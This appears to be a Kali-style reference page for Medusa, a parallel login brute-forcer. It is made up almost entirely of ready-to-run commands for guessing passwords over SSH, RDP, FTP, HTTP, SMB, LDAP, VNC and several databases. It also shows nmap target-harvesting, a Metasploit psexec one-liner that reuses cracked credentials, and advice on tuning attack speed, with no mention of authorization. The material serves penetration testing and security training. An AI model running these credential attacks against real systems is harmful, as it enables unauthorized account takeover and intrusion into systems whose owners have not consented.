---
title: "Medusa - Speedy, Parallel, Modular Login Brute-Forcer"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "Network Attacks"
tags:
  - "medusa"
  - "brute-force"
  - "password-cracking"
  - "parallel"
  - "modular"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "2.3"
tool_url: "https://github.com/jmk-foofus/medusa"
kali_url: "https://www.kali.org/tools/medusa/"
license: "GPL-2.0"
---

# Medusa - Speedy, Parallel, Modular Login Brute-Forcer

## Overview

**Medusa** is a speedy, massively parallel, modular, login brute-forcer designed to support as many remote authentication services as possible. Its modular architecture allows each service module to exist as an independent `.mod` file, enabling extension without modifying the core application.

**Key Features**:
- **Thread-based parallel testing** - Brute-force multiple hosts, users, or passwords concurrently
- **Flexible user input** - Single entries or files for hosts, users, and passwords
- **Modular design** - Independent service modules as `.mod` files
- **Combination file format** - Refine target listings with combo files
- **Resume capability** - Resume interrupted scans with `-Z`

**Supported Protocols**:
- **Remote Access**: SSH, RDP, Telnet, VNC, Rlogin, Rexec, Rsh
- **Web**: HTTP, HTTPS
- **Email**: SMTP, POP3, IMAP
- **Database**: MySQL, MSSQL, PostgreSQL, Oracle, Firebird
- **File Transfer**: FTP, TFTP, AFP
- **Directory**: LDAP, SNMP
- **Other**: SMB (SMBv1-3 with SMB signing), SIP, Asterisk, VMware Auth

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y medusa
```

### From Source

```bash
# Install dependencies
sudo apt install -y build-essential libfreerdp-dev libpq-dev libsvn-dev \
    libssh-dev libssl-dev libsmbclient-dev

# Clone and build
git clone https://github.com/jmk-foofus/medusa
cd medusa
./configure
make
sudo make install
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `-h HOST` | Single target hostname or IP |
| `-H FILE` | Target list file |
| `-u USER` | Single username |
| `-U FILE` | Username list file |
| `-p PASS` | Single password |
| `-P FILE` | Password list file |
| `-C FILE` | Combo file (host:user:pass) |
| `-M MODULE` | Module to execute (without .mod extension) |
| `-m PARAM` | Module parameter (can be repeated) |
| `-d` | Dump all known modules |
| `-n PORT` | Non-default TCP port |
| `-s` | Enable SSL |
| `-g SECS` | Give up after SECS seconds (default: 3) |
| `-r SECS` | Sleep SECS seconds between retries (default: 3) |
| `-R NUM` | Attempt NUM retries before giving up |
| `-c USECS` | Time to wait to verify socket (default: 500 usec) |
| `-t NUM` | Concurrent logins (default: 1) |
| `-T NUM` | Concurrent hosts (default: 1) |
| `-L` | Parallelize logins using one username per thread |
| `-f` | Stop host after first valid credential |
| `-F` | Stop audit after first valid credential on any host |
| `-b` | Suppress startup banner |
| `-q` | Display module usage information |
| `-v NUM` | Verbose level (0-6) |
| `-w NUM` | Error debug level (0-10) |
| `-V` | Display version |
| `-Z TEXT` | Resume scan based on map of previous scan |

### Module Parameters

| Module | Parameters |
|--------|------------|
| `ssh` | None required |
| `rdp` | None required |
| `ftp` | None required |
| `http` | `-m DIR:/path` |
| `mysql` | None required |
| `mssql` | None required |
| `postgres` | None required |
| `smb` | `-m GROUP:workgroup` |

## Usage Examples

### SSH Brute Force

**Single User, Password List**:
```bash
medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

**User List, Password List**:
```bash
medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh
```

**Multiple Hosts**:
```bash
medusa -H targets.txt -u root -P passwords.txt -M ssh
```

**Custom Port**:
```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

### RDP Brute Force

```bash
medusa -h 192.168.1.100 -u administrator -P passwords.txt -M rdp
```

### FTP Brute Force

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp
```

### HTTP Brute Force

**Basic Authentication**:
```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/
```

**Form-Based Authentication**:
```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/login.php
```

### MySQL Brute Force

```bash
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql
```

### MSSQL Brute Force

```bash
medusa -h 192.168.1.100 -u sa -P passwords.txt -M mssql
```

### PostgreSQL Brute Force

```bash
medusa -h 192.168.1.100 -u postgres -P passwords.txt -M postgres
```

### SMB Brute Force

```bash
medusa -h 192.168.1.100 -u administrator -P passwords.txt -M smb -m GROUP:WORKGROUP
```

### LDAP Brute Force

```bash
medusa -h 192.168.1.100 -u "cn=admin,dc=example,dc=com" -P passwords.txt -M ldap
```

### VNC Brute Force

```bash
medusa -h 192.168.1.100 -P passwords.txt -M vnc
```

### SNMP Brute Force

```bash
medusa -h 192.168.1.100 -u public -P passwords.txt -M snmp
```

### Combination File Attack

**Create Combo File**:
```bash
# Format: host:user:pass
echo "192.168.1.100:admin:password123" > combo.txt
echo "192.168.1.101:root:toor" >> combo.txt
```

**Attack with Combo File**:
```bash
medusa -C combo.txt -M ssh
```

### Parallel Attacks

**Multiple Hosts, Multiple Users**:
```bash
medusa -H targets.txt -U usernames.txt -P passwords.txt -M ssh -T 10 -t 5
```

**Parallel Login Testing**:
```bash
medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -L
```

### Resume Interrupted Scan

```bash
# First scan (interrupted)
medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh

# Resume scan
medusa -Z "192.168.1.100:ssh:user:pass" -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh
```

### SSL/TLS Attacks

```bash
# HTTPS
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -s -m DIR:/

# FTPS
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp -s
```

## Output Interpretation

### Successful Login

```
ACCOUNT FOUND: [ssh] Host: 192.168.1.100 User: admin Password: password123 [SUCCESS]
```

### Failed Attempt

```
ACCOUNT CHECK: [ssh] Host: 192.168.1.100 User: admin Password: wrongpass [FAILED]
```

### Module Information

```
[ssh] -p <port>  (default: 22)
```

## Module Management

### List Available Modules

```bash
medusa -d
```

### Get Module Help

```bash
medusa -q -M ssh
medusa -q -M http
medusa -q -M smb
```

### Module Directory

```bash
# Default module location
ls /usr/share/medusa/modules/

# Custom module location
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -m MODDIR:/path/to/modules
```

## Integration with Other Tools

### Nmap + Medusa Workflow

```bash
# 1. Find services
nmap -p 22,80,445,3306,3389 --open 192.168.1.0/24 -oG - > services.txt

# 2. Extract targets per service
grep "22/open" services.txt | awk '{print $2}' > ssh_hosts.txt

# 3. Brute force
medusa -H ssh_hosts.txt -u root -P passwords.txt -M ssh
```

### Metasploit Integration

```bash
# After finding credentials with Medusa
msfconsole -q -x "use exploit/windows/smb/psexec; set RHOSTS 192.168.1.100; set SMBUser admin; set SMBPass password123; exploit"
```

## Operational Security

### Rate Limiting

```bash
# Reduce concurrent connections
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -t 1

# Add delay between retries
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -r 10
```

### Logging

```bash
# Enable verbose output
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -v 6

# Log to file
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -O /tmp/medusa.log
```

## Common Issues and Troubleshooting

### Issue: "Module not found"

**Cause**: Module not installed or wrong path.

**Solution**:
```bash
# List available modules
medusa -d

# Check module directory
ls /usr/share/medusa/modules/

# Install from source if needed
git clone https://github.com/jmk-foofus/medusa
cd medusa/modules/ssh
make
```

### Issue: "Connection refused"

**Cause**: Service not running or firewall blocking.

**Solution**:
```bash
# Verify service is running
nmap -p 22 192.168.1.100

# Test connection manually
ssh root@192.168.1.100
```

### Issue: "Too many connections"

**Cause**: Target limiting connections.

**Solution**:
```bash
# Reduce concurrent logins
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -t 2

# Add delay
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh -r 5
```

### Issue: "SSL handshake failed"

**Cause**: SSL/TLS version mismatch.

**Solution**:
```bash
# Try different SSL options
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -s

# Or disable SSL verification (if supported)
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http
```

## Best Practices

### Wordlist Preparation

```bash
# Use rockyou.txt
cat /usr/share/wordlists/rockyou.txt | head -10000 > top10k.txt

# Create targeted wordlist
cewl -d 2 -m 5 http://target.com -w target_wordlist.txt

# Combine wordlists
cat /usr/share/wordlists/rockyou.txt target_wordlist.txt | sort -u > combined.txt
```

### Parallel Attacks

```bash
# Attack multiple hosts simultaneously
medusa -H targets.txt -u root -P passwords.txt -M ssh -T 10 -t 5

# Attack multiple services
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh &
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp &
wait
```

### Combo File Format

```bash
# Create combo file
echo "192.168.1.100:admin:password123" > combo.txt
echo "192.168.1.100:root:toor" >> combo.txt
echo "192.168.1.101:user:pass" >> combo.txt

# Use combo file
medusa -C combo.txt -M ssh
```

## Resources

- **GitHub Repository**: https://github.com/jmk-foofus/medusa
- **Kali Linux Tools**: https://www.kali.org/tools/medusa/
- **Documentation**: https://jmk-foofus.github.io/medusa/medusa.html
- **License**: GPL-2.0

## Related Tools

- **Hydra**: More protocol support, faster for standard protocols
- **Ncrack**: Network authentication cracking, good for large-scale audits
- **Patator**: Advanced features, more flexible but complex
- **Crowbar**: Specialized for SSH keys, OpenVPN, VNC
